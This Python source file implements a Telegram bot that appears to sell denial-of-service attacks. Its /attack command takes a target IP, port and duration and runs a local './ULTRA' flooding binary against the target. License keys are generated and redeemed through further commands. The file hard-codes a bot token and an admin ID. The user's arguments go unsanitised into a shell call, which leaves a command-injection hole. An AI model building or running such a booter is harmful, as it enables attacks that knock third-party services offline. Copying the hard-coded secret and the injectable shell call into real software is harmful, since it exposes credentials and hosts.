import os
import asyncio
import secrets  # For generating secure random keys
import time  # For tracking redemption time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Replace with your new bot token from BotFather
TELEGRAM_BOT_TOKEN = '7092345328:AAFph1hrE8sWnhUiIRdJ_uiOs_V_ojL5vDA'
ALLOWED_USER_ID = 6135948216  # Admin user ID

# In-memory storage for the generated key, redemption status, and expiration time
generated_key = None
key_redeemed = False
redeem_time = None  # Timestamp of key redemption
key_expiry_time = None  # Timestamp of key expiry

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def genkey(update: Update, context: CallbackContext):
    global generated_key, key_expiry_time  # Reference the global generated_key and key_expiry_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Check if a custom key length and expiry time are provided, default to 16 for key length and 1 day expiry if not
    key_length = 16  # Default length if no argument is provided
    expiry_days = 1  # Default expiry in 1 day
    expiry_hours = 0  # Default expiry time in 0 hours
    expiry_minutes = 0  # Default expiry time in 0 minutes

    if context.args:
        try:
            key_length = int(context.args[0])
            if key_length < 8 or key_length > 64:
                await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a key length between 8 and 64 characters!*", parse_mode='Markdown')
                return
        except ValueError:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid key length. Please provide a number between 8 and 64.*", parse_mode='Markdown')
            return

        # Parse the expiry time (if provided)
        try:
            expiry_days = int(context.args[1])
            expiry_hours = int(context.args[2])
            expiry_minutes = int(context.args[3])
        except IndexError:
            pass  # If no expiry time provided, defaults will be used
        except ValueError:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid expiry time. Please provide days, hours, and minutes as integers.*", parse_mode='Markdown')
            return

    # Generate a secure random key with the specified length
    generated_key = secrets.token_urlsafe(key_length)  # Generates a URL-safe key of the specified length
    
    # Calculate the expiration time (current time + expiry duration)
    current_time = time.time()
    expiry_time_in_seconds = expiry_days * 86400 + expiry_hours * 3600 + expiry_minutes * 60
    key_expiry_time = current_time + expiry_time_in_seconds

    # Reset redemption status and time
    global key_redeemed, redeem_time
    key_redeemed = False
    redeem_time = None  # Reset the redemption time

    # Send the generated key to the admin
    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*", parse_mode='Markdown')
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*⚠️ The key will expire at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(key_expiry_time))}*",
        parse_mode='Markdown'
    )

async def redeem(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time, key_expiry_time  # Reference the global variables

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user redeeming the key

    # Ensure the key exists and has not already been redeemed
    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
        return
    
    # Check if the key has already been redeemed
    if key_redeemed:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
        return

    # Check if the provided key matches the generated key
    key = ' '.join(context.args)
    if key != generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid key!*", parse_mode='Markdown')
        return

    # Check if the key has expired
    current_time = time.time()
    if current_time > key_expiry_time:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has expired!*", parse_mode='Markdown')
        return

    # Mark the key as redeemed and store the redemption time
    key_redeemed = True
    redeem_time = current_time

    await context.bot.send_message(chat_id=chat_id, text="*✅ Key successfully redeemed! You can now use the bot.*", parse_mode='Markdown')

async def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is authorized (admin)
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Check if the key is generated and redeemed
    if generated_key:
        redemption_status = "Redeemed" if key_redeemed else "Not Redeemed"
        redemption_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(redeem_time)) if redeem_time else "N/A"
        expiry_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(key_expiry_time)) if key_expiry_time else "N/A"
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*🔑 Key Information:*\n"
                f"Generated Key: {generated_key}\n"
                f"Redemption Status: {redemption_status}\n"
                f"Redemption Time: {redemption_time_str}\n"
                f"Expiry Time: {expiry_time_str}"
            ),
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')

async def kill_all_genkey(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time, key_expiry_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Reset all key variables
    generated_key = None
    key_redeemed = False
    redeem_time = None
    key_expiry_time = None

    # Notify the admin that all keys have been killed
    await context.bot.send_message(chat_id=chat_id, text="*⚠️ All keys have been killed and reset!*", parse_mode='Markdown')

async def main():
    # Create the application and the dispatcher to handle updates
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("kill", kill_all_genkey))

    # Start the bot
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
